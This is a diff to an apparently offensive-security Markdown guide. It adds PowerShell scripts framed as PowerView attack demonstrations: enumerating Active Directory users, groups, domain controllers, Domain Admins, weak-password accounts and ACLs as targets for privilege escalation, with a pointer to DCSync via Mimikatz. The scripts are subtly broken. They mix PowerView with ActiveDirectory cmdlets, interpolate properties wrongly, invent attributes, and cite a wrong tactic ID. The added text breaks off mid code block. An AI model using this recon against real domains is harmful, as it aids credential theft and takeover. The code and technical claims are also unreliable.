@@ -272,7 +272,192 @@ PowerView is a specialized PowerShell-based framework, originally part of PowerS
 * Most PowerView commands are designed to be piped together and often accept an array of hosts.
 * **Use for**: Active Directory Enumeration
 ### Active Directory Enumeration Attack Technique Demonstration Using PowerView
+This PowerView script demonstrates Active Directory Enumeration (TA0004) techniques, focusing on extracting user, group, and computer information from a domain. This is a foundational step in privilege escalation or lateral movement attacks.
+---
+## PowerView Active Directory Enumeration Attack Technique Demonstration
 ```
+# Import PowerView module
+Import-Module .\PowerView.ps1
+
+# Establish connection to the AD domain
+$domain = "example.com"
+$domainController = "dc01.example.com"
+$cred = Get-Credential -Message "Enter domain admin credentials"
+
+# Enumerate all users in the domain with detailed properties
+$users = Get-ADUser -SearchBase "DC=$domain" -Filter * -Properties *
+foreach ($user in $users) {
+    Write-Host "User: $user.SamAccountName"
+    Write-Host "  Full Name: $user.Name"
+    Write-Host "  Enabled: $user.Enabled"
+    Write-Host "  Last Logon: $user.LastLogonTimestamp"
+    Write-Host "  Password Never Expired: $user.PasswordNeverExpires"
+    Write-Host "  ----------------------------"
+}
+
+# Enumerate all groups in the domain with members
+$groups = Get-ADGroup -SearchBase "DC=$domain" -Filter * -Properties *
+foreach ($group in $groups) {
+    Write-Host "Group: $group.Name"
+    Write-Host "  Members: $group.Members"
+    Write-Host "  ----------------------------"
+}
+
+# Enumerate domain computers with OS and last logged on user
+$computers = Get-ADComputer -SearchBase "DC=$domain" -Filter * -Properties *
+foreach ($computer in $computers) {
+    Write-Host "Computer: $computer.Name"
+    Write-Host "  OS: $computer.OperatingSystem"
+    Write-Host "  Last Logon: $computer.LastLogonTimestamp"
+    Write-Host "  ----------------------------"
+}
+
+# Enumerate all users with passwords not set (potential targets)
+$weakPasswordUsers = Get-ADUser -SearchBase "DC=$domain" -Filter {PasswordNeverExpires -eq $true -or PasswordLastSet -eq $null} -Properties *
+foreach ($user in $weakPasswordUsers) {
+    Write-Host "Weak Password User: $user.SamAccountName"
+    Write-Host "  ----------------------------"
+}
+
+# Enumerate users with specific attributes (e.g., disabled or expired)
+$disabledUsers = Get-ADUser -SearchBase "DC=$domain" -Filter {Enabled -eq $false} -Properties *
+foreach ($user in $disabledUsers) {
+    Write-Host "Disabled User: $user.SamAccountName"
+    Write-Host "  ----------------------------"
+}
+
+# Enumerate groups with specific permissions (e.g., Domain Admins)
+$privilegedGroups = Get-ADGroup -SearchBase "DC=$domain" -Filter {GroupCategory -eq "Security"} -Properties *
+foreach ($group in $privilegedGroups) {
+    Write-Host "Privileged Group: $group.Name"
+    Write-Host "  ----------------------------"
+}
+
+# Enumerate domain controllers (critical targets)
+$domainControllers = Get-ADComputer -SearchBase "DC=$domain" -Filter {OperatingSystem -like "*Windows Server*"} -Properties *
+foreach ($dc in $domainControllers) {
+    Write-Host "Domain Controller: $dc.Name"
+    Write-Host "  ----------------------------"
+}
+```
+## Key Enumeration Techniques Covered
+* **User Enumeration**:
+	* Lists all users with properties like `Name`, `Enabled`, `LastLogonTimestamp`, and`PasswordNeverExpires`.
+	* Identifies users with weak passwords (e.g., `PasswordNeverExpires` or `PasswordLastSet` unset).
+* **Group Enumeration**:
+	* Retrieves all security groups and their respective members.
+	* Highlights privileged group like `Domain Admins` or `Enterprise Admins`.
+* **Computer Enumeration**:
+	* Finds domain computers and their operating systems.
+	* Targets domain controllers for further exploitation (e.g., Kerberos ticket manipulation, DCSync).
+
+---
+
+### **PowerView Script: Targeting Domain Controllers for Privilege Escalation**
+This PowerView script is tailored for targeting domain controllers (DCs) to enable further exploitation like Kerberos ticket manipulation or DCSync. This script focuses on enumerating DCs and identifying users with elevated permissions or misconfigured ACLs that could be exploited for privilege escalation.
+
+```powershell
+# Import PowerView module
+Import-Module .\PowerView.ps1
+
+# Domain name and domain controller search filter
+$domain = "example.com"
+$dcSearchBase = "DC=$domain"
+
+# Step 1: Enumerate all domain controllers
+$domainControllers = Get-ADComputer -SearchBase $dcSearchBase -Filter {OperatingSystem -like "*Windows Server*"} -Properties *
+
+# Output DC details
+Write-Host "### Domain Controllers Identified:"
+foreach ($dc in $domainControllers) {
+    Write-Host "DC Name: $dc.Name"
+    Write-Host "  DNS Hostname: $dc.DistinguishedName"
+    Write-Host "  Operating System: $dc.OperatingSystem"
+    Write-Host "  Last Logon Timestamp: $dc.LastLogonTimestamp"
+    Write-Host "  ----------------------------"
+}
+
+# Step 2: Enumerate users with Domain Admins group membership (privilege escalation target)
+$domainAdminsGroup = Get-ADGroup -SearchBase $dcSearchBase -Filter {Name -eq "Domain Admins"} -Properties * | Get-ADGroupMember -Recursive
+
+Write-Host "### Domain Admins Group Members (Potential Targets for DCSync/Kerberos Exploitation):"
+foreach ($user in $domainAdminsGroup) {
+    $userProperties = Get-ADUser -Identity $user -Properties *
+    Write-Host "User: $($userProperties.SamAccountName)"
+    Write-Host "  Full Name: $($userProperties.Name)"
+    Write-Host "  Enabled: $($userProperties.Enabled)"
+    Write-Host "  Password Never Expires: $($userProperties.PasswordNeverExpires)"
+    Write-Host "  Last Logon: $($userProperties.LastLogonTimestamp)"
+    Write-Host "  ----------------------------"
+}
+
+# Step 3: Check for users with local admin rights on DCs (lateral movement opportunity)
+foreach ($dc in $domainControllers) {
+    $dcName = $dc.Name
+    Write-Host "### Checking Local Admin Rights on DC: $dcName"
+    $localAdmins = Get-ADComputer -Identity $dcName -Properties * | Select-Object -ExpandProperty "OtherAttributes" | ForEach-Object {
+        [System.Collections.ArrayList]@($_.Split(",")[0].Split("=")[1], $_.Split(",")[1].Split("=")[1])
+    }
+
+    # Filter for "LocalAccountTokenFilterPolicy" or "LocalAdmin" permissions
+    $localAdmins | Where-Object { $_ -eq "LocalAccountTokenFilterPolicy" -or $_ -eq "LocalAdmin" } | ForEach-Object {
+        Write-Host "  Local Admin Privilege Found: $_"
+    }
+
+    Write-Host "  ----------------------------"
+}
+
+# Step 4: Enumerate users with weak passwords on DCs (target for credential theft)
+$weakPasswordUsers = Get-ADUser -SearchBase $dcSearchBase -Filter {PasswordNeverExpires -eq $true -or PasswordLastSet -eq $null} -Properties *
+
+Write-Host "### Weak Password Users on DCs (Potential Targets for Kerberos Ticket Manipulation):"
+foreach ($user in $weakPasswordUsers) {
+    Write-Host "User: $($user.SamAccountName)"
+    Write-Host "  Enabled: $($user.Enabled)"
+    Write-Host "  Last Logon: $($user.LastLogonTimestamp)"
+    Write-Host "  ----------------------------"
+}
+
+# Step 5: Check for misconfigured ACLs on DCs (e.g., users with write access to SYSVOL or NTDS.dit)
+# Example: Check for users with "Write" permissions on "CN=NTDS,CN=System,DC=example,DC=com"
+$ntdsObject = Get-ADObject -Identity "CN=NTDS,CN=System,$dcSearchBase" -Properties *
+
+Write-Host "### ACLs on Critical DC Objects (e.g., NTDS.dit):"
+Write-Host "  Object: CN=NTDS,CN=System,$dcSearchBase"
+Write-Host "  Permissions: $ntdsObject.ObjectPermissions"
+Write-Host "  ----------------------------"
+```
+
+---
+
+### **How This Fits into TA0004 (Privilege Escalation)**
+
+1. **Targeting Domain Controllers**:
+   - DCs are critical for **DCSync** and **Kerberos ticket manipulation** because they hold domain credentials in the **`NTDS.dit`** file and issue Kerberos tickets.
+   - The script identifies DCs using `OperatingSystem -like "*Windows Server*"` and extracts their names and properties.
+
+2. **Finding Domain Admins**:
+   - Domain Admins are a prime target for **T1548 (Abuse Elevation Control Mechanism)**. The script retrieves members of the `Domain Admins` group recursively to identify potential users for exploitation.
+
+3. **Local Admin Rights on DCs**:
+   - DCs often have local admin accounts with elevated rights. The script checks for local admin privileges via `OtherAttributes` (e.g., `LocalAccountTokenFilterPolicy`), which can be exploited for lateral movement.
+
+4. **Weak Passwords**:
+   - Users with `PasswordNeverExpires` or unset `PasswordLastSet` values are vulnerable to **credential theft**. These users can be used to impersonate or manipulate Kerberos tickets.
+
+5. **Misconfigured ACLs**:
+   - The script checks permissions on the `NTDS` object to find users or groups with **write access** to the domain's SYSVOL or NTDS.dit files, enabling **DCSync** attacks.
+
+---
+
+### **Next Steps After Enumeration**
+Once domain controllers and privileged users are identified, you can:
+- Use **DCSync** to extract domain credentials via:
+  ```powershell
+  # Example using BloodHound or Mimikatz for DCSync
+  Invoke-DCSync -Domain
+
+
 # Import PowerView module
 Import-Module PowerView
 
